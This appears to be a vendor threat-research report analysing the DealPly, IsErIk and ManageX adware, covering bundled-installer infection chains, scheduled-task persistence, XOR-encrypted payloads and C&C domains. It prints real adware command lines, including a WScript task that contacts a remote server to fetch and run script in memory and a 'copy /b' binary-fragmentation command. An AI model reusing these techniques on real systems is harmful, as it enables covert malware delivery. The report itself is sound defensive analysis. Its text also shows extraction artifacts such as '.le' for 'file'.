Adware isn’t new and they don’t spark much interest. A lot of them are overlooked and underestimated because they’re not supposed to cause harm ― as its namesuggests, adware is advertising-supported software. However, we have constantly observed suspicious activities caused by adware, with common behaviors thatinclude access to seemingly random domains with alternating consonant and vowel names, scheduled tasks, and in-memory execution via WScript that has proven tobe an effective method to hide their operations for at least four years. 
We will walk you through our analysis of three adware events that we eventually linked and variously named as Dealply, IsErIk, and ManageX. We studied theseevents from their persistence mechanisms to repetitive malicious domain access via root cause analysis (RCA) chains and uncovered several artifacts that provedoverlaps in the three infections. 
This research also discusses two case studies that show how adware could remain in systems for weeks, if not months, to complete its routine, and how they arrive inthe system. The adware DealPly (sometimes also referred to as IsErIk) and malicious Chrome extension ManageX, for instance, can come bundled under the guise ofa legitimate installer and other potentially unwanted applications (PUAs). Because various write-ups cover Dealply or IsErik separately, the technical discussion andrepresentation of both are discussed separately. 
Our analysis also reveals how these adware variants use various stealthy and suspicious techniques to perform their routines. IsErik and Dealply, for instance, couldload a piece of code coming from a remote server. Although we did not observe malware activities through the adware, we cannot discount the possibility that theycould be used maliciously. 

Initial indicators 
Among the thousands of logs our security analysts process each day, three persistent ones stood out due to the volume of alerts they generated and theirrepetitiveness. Aside from the reoccurring detections, these were also widely affecting a lot of other Trend Micro customers subscribed to Managed XDR.

 Here’s a sample URL; many of the URLs we found related to this case looked like this. We eventually linked this to JS.MANAGEX (a browser extension alsoknown as Bujo). Find the full list of observed domain names and other indicators of compromise (IoCs) in our appendix.

 The scheduled tasks either imitate search engines (e.g., Yahoo! Powered {random name}.job like with IsErIk), or use a name that looks like a GUID like withDealPly.

 A JavaScript saved as a .txt .le (detected by Trend Micro as Adware.JS.DEALPLY.SMMR) is also executed via WScript with hex-encoded parameters and acommon string “―IsErIk”. 




Figure 2. Executed .txt .le via WScript Below we will look into two case studies that exhibited the abovementioned indicators and summarize the noteworthy points in our analyses of their routines. 

Case study #1: Root cause analysis (RCA) C February 2020 infection 
Illustrated below is a simpli.ed version of the RCA of a recent infection in a Managed XDR-monitored endpoint. It shows how Dealply, ManageX, and other PUAssuch as Segurazo Fake AV can be bundled together in one installation. 
Figure 3. A simpli.ed version of the RCA of a recent infection in a Managed XDR-monitored endpoint 
The infection began with the .le called email_open_view_pro_free.exe, which, judging from the way it was launched via explorer.exe, was manually executed bythe user. Its descriptive .lename also suggests that it could have been downloaded from the internet as a seemingly legitimate installer or freeware. 
The email_open_view_pro_free.exe .le created 2 new processes: 

“Segurazo.exe” C an installer that we know is a fake AV (detected as PUA.MSIL.Segurazo.SMCS); “segurazo” also means “security” in Portuguese 

“danuci.exe” C created furthermore indicators that we later on recognized as DealPly 
It should be noted that DealPly .les are normally named like this. They seem random, with alternating consonants and vowels. Names like “danuci” and “netenare”are names that could be suspected as DealPly right away just by looking at their .lenames. 
The .le netenare.exe then creates two .dat .les and joins them to form syncversion.exe, a .le we also detect as DealPly. The executable also initiates access to the blocked server pajuwu[.]com, a domain known to be generated by DealPly binaries. 
In each of these nodes, there were little details not shown in the graphical representation that we think are important to mention. For instance, aside fromnetenare.exe, danuci.exe also created .les like the following: 
c:\users\<user>\appdata\roaming\mozilla\.refox\pro.les\m9kxv7k5.default-release\extensions\{24436206-088d-4a1a-8d0e-cf93ca7a2d23}.xpic:\users\<user>\appdata\local\chromium\user data\default\local storage\chrome-extension_ncjbeingokdeimlmolagjaddccfdlkbd_0.localstorage-journalc:\users\<user>\appdata\local\chromium\user data\default\local storage\chrome-extension_ncjbeingokdeimlmolagjaddccfdlkbd_0.localstoragec:\users\<user>\appdata\local\chromium\user data\default\local storage\chrome-extension_jghiljaagglmcdeopnjkfhcikjnddhhc_0.localstorage-journal

Table 1. Installation of several browser extensions 
A quick Google search links the two Chrome AppIDs to domains we know are being used by the ManageX Chrome extension. ManageX uses a malicious extensionto the Chrome browser to track users’ browser activities and communicate with C&C domains. Further information about ManageX can be found in our virus report,including the contents of the Chrome extension such as various permissions and related C&C servers.

Case study #2: Timeline of an older infection (2016-2017) 
In another case we looked into, we observed the same domains across the environment. Since these were easily caught with our .lters and we were already quitefamiliar with the indicators, we were able to perform in-depth analyses on several of the endpoints. 
Based on our .ndings, the hosts within the environment got infected as early as 2016. Despite being relatively dated, we thought that an in-depth analysis of this 2016infection was still relevant since it gave us a better understanding of the adware’s progression and timeline. 
The .rst thing we noticed was the presence of both DealPly and IsErik’s scheduled tasks. Based on previously known infections, we usually see DealPly create a .job.lename that looks like a GUID, while IsErik usually uses something related to a search engine, which we saw in the endpoint we were looking at: 
Figure 6. IsErIk involves search engines in its routine 
After identifying the relevant time ranges, we expanded our search on the .le system. The search found several other suspicious .les in the same endpoint that wethink are related. 
Figure 7. Files arranged according to their creation timestamps 
After tracing back the .le timestamps, we found that the .rst suspicious indicator created in June 2016 was %AppData%\Local\{F440C21C-D0E8-AEA4-BD70-8B4C991877D4}, and it came with several other things: 
Figure 8. Other directories and a .le created along with the .rst indicator 
Using the timeline from the NTFS MFT (master .le table), we were able to pinpoint one .le for analysis: conf.db. By itself, it is non-malicious and only containsunknown MD5 hashes. It is a possible indication that this is bundled with other installations, similar to Case Study #1. 
Going through the timeline as early as July 2016 
To understand what happened during this installation, we need to analyze the events beginning with the scheduled task. This is what “Yahoo! Powered ronof.job” will execute: 
C:\Windows\system32\wscript.exe “C:\ProgramData\{9D025861-1740-D2A7-9186-4CE50BC4C72B}\sole.txt” “687474703a2f2f7761676e672e636f6d”“433a5c50726f6772616d446174615c7b39443032353836312d313734302d443241372d393138362d3443453530424334433732427d5c6e69666f7261” “433a5c50726f6772616d446174615c7b39443032353836312d313734302d443241372d393138362d3443453530424334433732427d5c6e65746564656e” “//B” “//E:jscript” “CIsErIk” 
After decoding this, it will return with: 
C:\Windows\system32\wscript.exe “C:\ProgramData\{9D025861-1740-D2A7-9186-4CE50BC4C72B}\sole.txt” “http://wagng[.]com” “C:\ProgramData\{9D025861-1740-D2A7-9186-4CE50BC4C72B}\nifora” “C:\ProgramData\{9D025861-1740-D2A7-9186-4CE50BC4C72B}\neteden” “//B”“//E:jscript” “CIsErIk” 
This means that when the scheduled task is triggered, it will run “C:\ProgramData\{9D025861-1740-D2A7-9186-4CE50BC4C72B}\sole.txt” as JavaScript viawscript.exe. During the analysis, this .le was non-existent. It is assumed that it was deleted after execution. The .le sole.txt is then called with the followingparameters: 

http://wagng[.]comC:\ProgramData\{9D025861-1740-D2A7-9186-4CE50BC4C72B}\niforaC:\ProgramData\{9D025861-1740-D2A7-9186-4CE50BC4C72B}\netedenCIsErIk 




Trend Micro detects similar JavaScripts as Adware.JS.DEALPLY.SMMR, also known as advanced persistent adware or IsErIk externally. 
The .rst thing it checks is if the JavaScript was called with the last argument “―IsErIk”. If not, the script execution terminates. Based on its code, the .le aowLC serves as an indicator of the adware’s last update time. It uses the .le’s last modi.ed date for this purpose. 
If all conditions are met, the script proceeds on the rest of its code where these two .les were read: 

hdat2
 C contains hex-encoded strings that represents the parameters passed to a URL. (i.e., “?v=2.2&pcrc=167877582&rv=4.0”)


hdat1
 C the contents of this .le will be sent to the server speci.ed as a parameter when the script was called 


The script’s main purpose is to communicate with the server speci.ed as a parameter (wagng[.]com in this case) via HTTP POST and to execute another script inmemory when the server responds. Response from the server is decoded using its custom decryption routine and then ran as a new function. 
Figure 9. Script for connecting to a remote server via HTTP POST 
We noticed in the July 2, 2016 entry that aowLC (the infection marker) was created exactly 12 hours after the scheduled task, indicating the .rst time the IsErIk scriptwas executed. (This scheduled task was likely set to run every 12 hours.) At this point, it appears the script could not get any response from the server, which is whyaowLC was the last created .le that day. However, we can infer that on July 30 and November 18, the script successfully contacted the server, which consequently ledto the creation of DealPly-related .les. 
Figure 10. Recorded DealPly-created .les 
Installation of the new adware .les continued until September 2017, as we can also see from the timeline we showed earlier. 
Layers of obfuscation 
To understand why an adware variant would use such complex installation techniques, we examined the other available remaining .les. In this list, we found severalencrypted PE .les that were particularly interesting. For one thing, some of them looked like this: 
Figure 11. An encrypted PE .le 
Figure 12. A simple XOR decryption revealed a hidden PE .le

rino (1).dat PUA_DEALPLY.SM 
A35F30A12C2 

Table 2. Some of the .les that used simple XOR decryption 
Our analysis revealed that rino.dat and rino (1).dat are both updated copies of the DealPly installer. Similar to netenare.exe in Case Study #1, it creates two .dat .les and joins them to form an executable .le. These are the most common .lenames used for the newly formed executables: 

Sync.exeSynctask.exeSyncversion.exeUpdane.exeUpdater.exeUpdTask.exe 






After this, a scheduled task will be created to run the new executable .le on schedule. In the 2017 timeline (January 18 to be exact), the .le created was “sync.exe” with the corresponding scheduled task of “{3CB9B109-866A-591E-48D3-17289C7F88F1}.job”. In some cases, a VBScript is used to create a RunOnce autostart forthe executable. 
Normally, these newly formed .les with auto-start also connect to a remote server. In a sample we analyzed from another case, the server responded with an XOR-encrypted DLL after it sent the following information via HTTP POST: 
Figure 13. Data shown before encryption 
During analysis, the DLL .le was not saved on disk, indicating re.ective loading. It is also responsible for creating the following .les, which are also evident in thetimeline above: 

info.dat TTL.DAT WB.cfg 



These .les are non-executable and only contain installation details such as installation date and last operating system. Eventually, the DLL will attempt to downloadanother .dat .le. Unfortunately, we were unable to get a download response during our testing; based on the timing sequence, we surmise that sb953.dat and sb703.dat might be the response. 
Ensilo (now Fortinet) described DealPly’s network communication and other interesting behaviors in detail here. 
Hidden facts 
The other encrypted .les were also PE .les, but the headers aren’t quite right. 
Figure 14. Another encrypted PE .le 
Even though we do not have the decryption code and are unable to fully decrypt these .les, we eventually .gured out how to extract the strings from the .le by usinga translate function wherein each character is swapped with another one in the ASCII table. For example, “c” is swapped with “x,” “F” with “L,” and so on. Each .lehas a different translation table. Below are some of the .les encrypted this way:

Table 3. Filenames and corresponding interesting strings 
We observed that most machines with a DealPly infection also have Sqlite3.dll (non-malicious) in the adware folder. (It is to be noted that Sqlite is an extensively used database format. Coincidentally, the encrypted .les (bapi_ie.dat, bapi_chmm.dat, and bapi_ff.dat) also contain SQLite-related strings, which suggest that the.les may be used to perform database-related tasks. 
Since we could not fully decrypt these .les, we were also unable to analyze them to identify their purpose. Based on the partially extracted strings and combined withthe fact that sqlite3.dll was observed in our analysis, it is highly possible that it would be used to interact with the SQLite databases of browsers within the system, asit is known that both Chrome and Firefox utilize SQLite databases to store their data. 
The other set of .les contains libcurl-related strings, which is a multi-protocol .le transfer library. That being said, it has the potential to interface with multipleprotocols like HTTPS, HTTP, or FTP. It is unclear if this library has been used for malicious purposes, but in a 2018 report, these strings were also found in samplesthat were once used by the APT group Hidden Cobra as a proxy module to allow incoming connections and force the infected system to act as a proxy server. 


Noteworthy points from our analyses 

DealPly and ManageX can come bundled in a seemingly legitimate installer, along with other PUAs. We observed the same entry point as Case Study #1 inanother machine, which was called “Baixaki_Baixar Musicas Gratis_3890201077.exe” (translates to Baixaki_Download Free Music_3890201077.exe inPortuguese). But it did not come with the Segurazo fake AV. 
Figure 15. Infection chain without the fake AV 
There was no concrete evidence in Case Study #2 regarding the source, but based on the artifacts created on the .rst infection date, it might also have come
from a software installation bundle. 


The
 installation of this adware is highly modular and does not complete its routine right away. Based on our observation, it takes a few weeks to months beforeit can connect to its servers successfully.


The
 technique used by this adware, whereby two .les are conjoined to form another .le, is called binary fragmentation and is used to evade detection. Carbon Black published an article years ago about how it was used by Operation Aurora. Below is an example of the fragmentation technique seen in one of ouranalyses: 


CLI: c:\windows\syswow64\cmd.exe /c cmd /d /c copy /b /y /v“c:\users\\appdata\local\temp\d3284081000781.dat”+”c:\users\\appdata\local\temp\d3284081000782.dat”“c:\users\\appdata\roaming\14be90~1\syncversion.exe” & cmd /d /c del “c:\users\\appdata\local\temp\d3284081000781.dat” & cmd /d /c del“c:\users\\appdata\local\temp\d3284081000782.dat” 
Carbon Black researchers also believed that threat actors are using known adware variants, including DealPly, as a delivery mechanism for ransomware and othermalware. While we have observed several cases of ransomware in the same machines infected by DealPly, we have no concrete evidence to prove their relationship.In spite of this, we agree that this adware can easily be used as an agent to deliver malware covertly, given its modular nature. 

Global distribution 
Our telemetry indicates the widespread installation of the mentioned PUAs, with the United States, Japan, and Taiwan topping the counts. The IsErIk count is basedon behavior monitoring, which detects the command line parameter “CIsErIk”, while both DealPly and ManageX are based on signature-based detections data fromthe Trend Micro. Smart Protection Network. security infrastructure. 
Figure 16. Top 10 affected countries,based on data from the Trend Micro Smart Protection Network infrastructure for the period of December 18, 2019 to March 17, 2020 
Among all users with known industry classi.cations, the top industries across all the three adware detections mentioned above were consistent: Education,Government, and Manufacturing. 
Figure 17. Top 10 affected industries,based on data from the Trend Micro Smart Protection Network infrastructure for the period of December 18, 2019 to March 17, 2020Note: We removed duplicated counts based on GUIDs. This means that the counts include multiple endpoints belonging to the same company. 

Correlating DealPly, IsErIk and ManageX 
When we started our probe, we considered all these as separate even though they share common traits such as the use of scheduled tasks and the similar way itsservers were named. However, through Managed XDR, we were able to link them together. To see if this is consistent with global data, we gathered more informationfrom SPN. 
Figure 18. The number of DealPly, IsErIk, and ManageX detections and their infection intersections in endpoints, based on data from the Trend Micro SmartProtection Network infrastructure for the period of December 18, 2019 to March 17, 2020: DealPly led the number of detections; we also observed the three threatsto have concurring infections in machines. 
While there are signi.cantly higher numbers for individual detections, hundreds to thousands of intersections between two or three of these adware do not seem like acoincidence. Furthermore, the large number of detections could be attributed to detection coverage, which appears higher for DealPly because of multiple patterndetections. 
Since Trend Micro detects a lot of these variants, it is likely that most of these infections were already blocked before complete installation. Therefore, the numbersshown in this diagram could be smaller than the actual intersections. Along with the results of our analyses, and considering the points mentioned, we think that thereis a high likelihood that these adware commonly coexist. 
We also tried to correlated the C&C servers used, but a huge part of it is entirely disconnected. Only two pairs had similarities. 
ManageX IP address DealPly
qamopo[.]com 13.32.230.240 tuwoqol[.]compacudoh[.]com 52.222.149.67 daqah[.]com 
Table 4. The IP addresses DealPly and ManageX share 
While the intersection is too weak to summarize that these three threats are interrelated based on network infrastructure, we do have to point out that the domainswere registered through the Israeli registrar Galcomm’s privacy protection service (domainprivacy@galcomm[.]com). A few years back, Ars Technica ran an article 
about when SourceForge bundled GIMP for Windows with adware. The installer(s) of GIMP also came bundled with similar adware, which was also registeredthrough Galcomm’s privacy protection service. 

Conclusion and Trend Micro solutions 
Mitigating adware (or potentially unwanted applications) would normally be secondary to dealing with threats such as hacking tools, backdoors, and ransomware.However, there is a large disconnect in dealing with alerts visible through the lens of a security operations center (SOC) analyst: Why is this host suddenlycommunicating to a command-and-control (C&C) server? How was the threat introduced? Why is it seemingly slipping past defenses? 
The seemingly disconnected and repetitive alerts for hosts reaching out to C&C servers, and repetitive detections of low priority threat (adware) led us to these threepoints: 

As
 evidenced in the details we discussed, linking separate and seemingly disparate events into a single timeline is a de.nite challenge as threats are turning tosophisticated methods to maintain persistence and continuously evolve if not fully mitigated. Using open-source intelligence (OSINT) could only give analystsa glimpse of its relevant connections and is not as suf.cient. Using security expertise also helps provide meaningful alerts and alleviates security operationsteams. 


Through
 the effective use of technologies of a Trend Micro product (Apex One’s Endpoint Detection and Response module called Endpoint Sensor inparticular), Trend Micro’s Managed XDR Service was able to perform advanced threat analysis, correlation, and research while monitoring and detectingthreats of these highly prevalent clusters of adware.


Only
 through careful observation are details slowly uncovered, delivering analysis of where the attack came from, its infection chain, and mitigation strategiesover time. Thus, the speed of converting these discoveries and translating them into mitigation strategies is key to improve the security posture of anyenvironment rapidly. 


Organizations and governments can bene.t from advanced Trend Micro solutions that can proactively keep IT environments protected from a wide range ofcybersecurity threats. The Trend Micro XDR solution effectively protects connected emails, endpoints, servers, cloud workloads, and networks. Trend Micro XDRuses powerful AI and expert security analytics to correlate data, as well as deliver fewer higher-.delity alerts for early threat detection. In a single console, it providesa broader perspective of enterprise systems as well as a more focused and optimized set of alerts. This provides IT security teams with better context for identifyingthreats more quickly, helping them understand and remediate impact much more effectively. 
Meanwhile, Trend Micro Managed XDR provides expert threat monitoring, correlation, and analysis from skilled and seasoned Managed Detection and Responseanalysts. Managed XDR is a .exible, 24/7 service that allows organizations to have one single source of detection, analysis, and response.
